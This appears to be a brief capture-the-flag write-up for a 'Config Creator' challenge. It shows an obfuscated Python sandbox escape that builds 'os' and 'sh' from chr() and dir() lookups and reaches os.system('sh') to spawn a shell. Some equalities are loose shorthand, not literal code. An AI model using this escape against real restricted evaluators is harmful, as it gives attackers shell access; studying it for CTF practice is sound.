# Write-up | Config Creator

getattr(chr(111),dir(chr(111))[0])(chr(115)) == "os"

__import__(getattr(chr(111),dir(chr(111))[0])(chr(115))) == __import__("os")

dir(__import__(getattr(chr(111),dir(chr(111))[0])(chr(115))))[269] == "system"

getattr(__import__(getattr(chr(111),dir(chr(111))[0])(chr(115))),dir(__import__(getattr(chr(111),dir(chr(111))[0])(chr(115))))[269]) == __import__("os.system")

getattr(chr(115),dir(chr(115))[0])(chr(104)) == "sh"

getattr(__import__(getattr(chr(111),dir(chr(111))[0])(chr(115))),dir(__import__(getattr(chr(111),dir(chr(111))[0])(chr(115))))[269])(getattr(chr(115),dir(chr(115))[0])(chr(104))) == __import__("os.system")("sh")



Please see *exploit/exploit.py* for the full automated exploit.
